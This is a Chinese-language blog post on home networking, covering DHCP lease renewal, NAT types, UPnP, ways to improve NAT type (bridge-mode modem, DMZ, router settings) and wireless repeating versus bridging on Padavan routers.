<h3 id="IP-地址的收回和续租"><a href="#IP-地址的收回和续租" class="headerlink" title="IP 地址的收回和续租"></a>IP 地址的收回和续租</h3><p>既然是租房子，就是有租期的。租期到了，管理员就要将 IP 收回。</p>
<p>如果不用的话，收回就收回了。就像你租房子一样，如果还要续租的话，不能到了时间再续租，而是要提前一段时间给房东说。DHCP 也是这样。</p>
<p>客户机会在租期过去 50% 的时候，直接向为其提供 IP 地址的 DHCP Server 发送 DHCP request 消息包。客户机接收到该服务器回应的 DHCP ACK 消息包，会根据包中所提供的新的租期以及其他已经更新的 TCP/IP 参数，更新自己的配置。这样，IP 租用更新就完成了。</p>
<p>好了，一切看起来完美。DHCP 协议大部分人都知道，但是其实里面隐藏着一个细节，很多人可能不会去注意。接下来，我就讲一个有意思的事情：网络管理员不仅能自动分配 IP 地址，还能帮你自动安装操作系统！</p>
<h2 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h2><blockquote>
<p>网络地址转换（英语：Network Address Translation，缩写：NAT；又称网络掩蔽、IP 掩蔽）在计算机网络中是一种在IP数据包通过路由器或防火墙时重写来源 IP 地址或目的 IP 地址的技术。这种技术被普遍使用在有多台主机但只通过一个公有 IP 地址访问因特网的私有网络中。它是一个方便且得到了广泛应用的技术。当然，NAT 也让主机之间的通信变得复杂，导致了通信效率的降低。</p>
</blockquote>
<h3 id="NAT-转换规则"><a href="#NAT-转换规则" class="headerlink" title="NAT 转换规则"></a>NAT 转换规则</h3><ul>
<li><p>对于 TCP/UDP 使用<br>Host ‘s 私有 IPv4 + Port &lt;——&gt; NAT 公网 IPv4 + Port</p>
</li>
<li><p>对于ICMP使用<br>Host ‘s 私有 IPv4 + session ID &lt;——&gt; NAT 公网 IPv4 + session ID</p>
</li>
</ul>
<p>规则其实非常好理解，由于 session ID 在 NAT 设备上是独一无二的，所以NAT可以很容易区别局域网内部的不同 host。</p>
<p>至于其它传输协议，NAT 使用的也是类似 session ID 的转换规则，即使用可以将不同 host 轻易分辨出来的字段做键值（KEY），动态创建映射表项，做双向的地址+ KEY 的转换。</p>
<h3 id="不同类型的-NAT"><a href="#不同类型的-NAT" class="headerlink" title="不同类型的 NAT"></a>不同类型的 NAT</h3><h4 id="完全圆锥型-NAT（Full-cone-NAT），即一对一（one-to-one）NAT"><a href="#完全圆锥型-NAT（Full-cone-NAT），即一对一（one-to-one）NAT" class="headerlink" title="完全圆锥型 NAT（Full cone NAT），即一对一（one-to-one）NAT"></a>完全圆锥型 NAT（Full cone NAT），即一对一（one-to-one）NAT</h4><ul>
<li>一旦一个内部地址（iAddr:port）映射到外部地址（eAddr:port），所有发自 iAddr:port 的包都经由 eAddr:port 向外发送。任意外部主机都能通过给 eAddr:port 发包到达 iAddr:port（注：port不需要一样）</li>
</ul>
<p><img src="/images/home-internet5.png" alt="3417f32a.png"></p>
<h4 id="受限圆锥型-NAT（Address-Restricted-cone-NAT）"><a href="#受限圆锥型-NAT（Address-Restricted-cone-NAT）" class="headerlink" title="受限圆锥型 NAT（Address-Restricted cone NAT）"></a>受限圆锥型 NAT（Address-Restricted cone NAT）</h4><ul>
<li>内部客户端必须首先发送数据包到对方（IP=X.X.X.X），然后才能接收来自 X.X.X.X 的数据包。在限制方面，唯一的要求是数据包是来自 X.X.X.X。</li>
<li>内部地址（iAddr:port1）映射到外部地址（eAddr:port2），所有发自 iAddr:port1 的包都经由 eAddr:port2 向外发送。外部主机（hostAddr:any）能通过给 eAddr:port2 发包到达 iAddr:port1。（注：any指外部主机源端口不受限制，但是目的端口必须是 port2。只有外部主机数据包的目的 IP 为 内部客户端的所映射的外部 ip，且目的端口为 port2 时数据包才被放行。）<br><img src="/images/home-internet6.png" alt="077d46e4.png"></li>
</ul>
<h4 id="端口受限圆锥型NAT（Port-Restricted-cone-NAT）"><a href="#端口受限圆锥型NAT（Port-Restricted-cone-NAT）" class="headerlink" title="端口受限圆锥型NAT（Port-Restricted cone NAT）"></a>端口受限圆锥型NAT（Port-Restricted cone NAT）</h4><p>类似受限制锥形NAT（Restricted cone NAT），但是还有端口限制。</p>
<ul>
<li>一旦一个内部地址（iAddr:port1）映射到外部地址（eAddr:port2），所有发自 iAddr:port1 的包都经由 eAddr:port2 向外发送。</li>
<li>在受限圆锥型NAT基础上增加了外部主机源端口必须是固定的。<br><img src="/images/home-internet7.png" alt="e59a101f.png"></li>
</ul>
<h4 id="对称-NAT（Symmetric-NAT）"><a href="#对称-NAT（Symmetric-NAT）" class="headerlink" title="对称 NAT（Symmetric NAT）"></a>对称 NAT（Symmetric NAT）</h4><ul>
<li>每一个来自相同内部 IP 与端口，到一个特定目的地地址和端口的请求，都映射到一个独特的外部 IP 地址和端口。</li>
<li>同一内部 IP 与端口发到不同的目的地和端口的信息包，都使用不同的映射<br>只有曾经收到过内部主机数据的外部主机，才能够把数据包发回</li>
</ul>
<p><img src="/images/home-internet8.png" alt="9692d914.png"></p>
<h2 id="UPnP"><a href="#UPnP" class="headerlink" title="UPnP"></a>UPnP</h2><blockquote>
<p>通用即插即用（英语：Universal Plug and Play，简称UPnP）是由“通用即插即用论坛”（UPnP™ Forum）推广的一套网络协议。该协议的目标是使家庭网络（数据共享、通信和娱乐）和公司网络中的各种设备能够相互无缝连接，并简化相关网络的实现。UPnP 通过定义和发布基于开放、因特网通讯网协议标准的 UPnP 设备控制协议来实现这一目标。</p>
</blockquote>
<p>可以理解为有了 UPnP 软件可以根据需求让路由器进行动态地进行端口映射。而不是你去路由器后台一个个手动设置。</p>
<h2 id="提升-NAT-类型"><a href="#提升-NAT-类型" class="headerlink" title="提升 NAT 类型"></a>提升 NAT 类型</h2><p>一般来说，我们希望 NAT 层数越少越好。每多一层 NAT 就意味着更加复杂的情况与配置。依旧是典型的网络拓扑：</p>
<blockquote>
<p>入户光纤① → 猫② → 路由器③ → 终端设备</p>
</blockquote>
<p>我们目标是把 NAT 降到1层（只有③），当然这是目标，但不是必须的。</p>
<h3 id="拿到公网-IP"><a href="#拿到公网-IP" class="headerlink" title="拿到公网 IP"></a>拿到公网 IP</h3><p>拥有公网 IP 对于 P2P 应用来说绝对是一个基础要求，这可以省掉许多麻烦（使①不发生 NAT）。如何确定自己是不是公网 IP 也很简单。访问这里你可以得到一个 IP 地址，把它与路由器中显示的 WAN 口 IP 进行比较，如果一致那么就是公网 IP 了。</p>
<p>如果不一致，那么只能联系运营商，自己是没有办法的。一般来说一级运营商（电信/联通）比较容易，而一些二级甚至三级运营商（长城）就没什么希望了。如果拿不到公网 IP，只能期望运营商不要把 NAT 类型限制太死吧。</p>
<h3 id="光猫改为桥接模式"><a href="#光猫改为桥接模式" class="headerlink" title="光猫改为桥接模式"></a>光猫改为桥接模式</h3><h4 id="区分桥接与路由模式"><a href="#区分桥接与路由模式" class="headerlink" title="区分桥接与路由模式"></a>区分桥接与路由模式</h4><p>现在原来越多的猫“越权管理”，增加了路由功能，也就是说猫和路由器一体化了。每一个路由器可以理解为一层网络，我们不希望层数过多。同时猫的路由功能往往不完善，难以进行高级配置。而桥接模式就是让猫回归本质，只负责信号转换。</p>
<p>区分路由与桥接模式最方便的办法是：如果你的路由器（电脑）直接连到猫上就可以上网，那么是路由模式；如果路由器需要配置 PPPoE 拨号那么就是桥接模式。</p>
<h4 id="更改模式"><a href="#更改模式" class="headerlink" title="更改模式"></a>更改模式</h4><p>一般来说更改模式需要猫的超级密码，这个用户是没有的。请联系运营商客服请求修改。改为桥接后②也不会发生 NAT 了。</p>
<p><strong>警告</strong>：没能力折腾的不建议自己破解改。更改桥接模式之后记得重新配置路由器，输入宽带账号密码才可以正常上网。</p>
<h3 id="更改路由器设置"><a href="#更改路由器设置" class="headerlink" title="更改路由器设置"></a>更改路由器设置</h3><p>首先要修改 NAT 类型，并不是所有的路由器或者路由器系统都支持这一设置。打开 NAT 并将类型设置为最宽松的 NAT1（Full cone NAT）。</p>
<p>接着启用 UPnP，绝大部分路由器都支持的，耐心找一找。如果真的不支持那我建议换路由器。</p>
<p>如果不支持上述的 NAT 类型设置，我们还有一个大招。大部分的路由器都支持 DMZ （非军事化区），DMZ 指定的设备完全暴露在公网上。但是一个网络一般只能够设置1个 DMZ，显然如果设置多个路由器就不知道应该把数据包交给谁了。由于 DMZ 是和 IP 绑定的，而 IP 是动态分配的。所有首先我们将 IP 与 MAC 绑定（不同的路由器设置不同），然后将此 IP 设置为 DMZ 即可。</p>
<h3 id="更改系统设置"><a href="#更改系统设置" class="headerlink" title="更改系统设置"></a>更改系统设置</h3><p>最后如果你的系统启用了防火墙那么记得将需要的程序添加例外，或者关闭防火墙（不推荐）。最后进行测试，NAT 类型应该可以提升到完全圆锥型NAT（Full cone NAT）。</p>
<h2 id="无线中继和桥接"><a href="#无线中继和桥接" class="headerlink" title="无线中继和桥接"></a>无线中继和桥接</h2><p>以 hiboy 的老毛子 Padavan 系统路由器为例，介绍一下无线中继和桥接的异同：</p>
<ul>
<li>无线中继：选择 AP + AP Client，接 LAN 就要关闭本路由 DHCP，上级路由开启 DHCP，本路由的 IP 不能和上级一样，但要在一个网段里。例子：一个是 192.168.1.1，另一个是 192.168.1.2。</li>
<li>无线桥接：选择 AP + AP Client，接 WAN 就要开启本路由 DHCP，上级路由开启 DHCP，本路由的 IP 不能和上级同网段。例子：一个是 192.168.1.1，另一个是 192.168.2.1。</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://zh.wikipedia.org/">维基百科，自由的百科全书</a></li>
<li><a href="https://www.chenhe.cc/p/41">NAT 科普与类型提升 – 晨鹤小站(｡･∀･)ﾉﾞ</a></li>
<li><a href="https://right.com.cn/forum/thread-182967-1-1.html">老毛子Padavan固件 无线中继实践心得分享 - Padavan - 恩山无线论坛 - Powered by Discuz!</a></li>
<li><a href="https://www.zhihu.com/question/20380724">无线网络的中继和桥接有什么区别？ - 知乎</a></li>
<li><a href="https://www.zhihu.com/question/31332694">NAT转换是怎么工作的？ - 知乎</a></li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>网络</tag>
      </tags>
  </entry>
</search>
